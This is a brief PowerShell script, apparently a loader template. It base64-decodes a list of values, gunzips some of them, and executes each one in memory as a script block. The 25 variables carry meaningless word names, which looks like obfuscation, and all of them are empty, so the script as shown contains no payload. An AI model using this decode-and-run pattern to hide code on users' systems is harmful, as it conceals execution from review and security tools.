#Requires -Version 2

$Teargasses = ""
$Labyrinths = ""
$Transmuted = ""
$Lesbianism = ""
$Triggering = ""
$Cluttering = ""
$Equalizers = ""
$Jubilantly = ""
$Blasphemes = ""
$Trellising = ""
$Potentates = ""
$Preterites = ""
$Overburden = ""
$Housemaids = ""
$Guerrillas = ""
$Channeling = ""
$Tarnishing = ""
$Puppeteers = ""
$Teetotaler = ""
$Semifinals = ""
$Skirmishes = ""
$Parallaxes = ""
$Retreating = ""
$Washstands = ""
$Coincident = ""

$Modules = @($Teargasses,$Labyrinths,$Transmuted,$Lesbianism,$Triggering,$Cluttering,$Equalizers,$Jubilantly,$Blasphemes,$Trellising,$Potentates,$Preterites,$Overburden,$Housemaids,$Guerrillas,$Channeling,$Tarnishing,$Puppeteers,$Teetotaler,$Semifinals,$Skirmishes,$Parallaxes,$Retreating,$Washstands,$Coincident)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
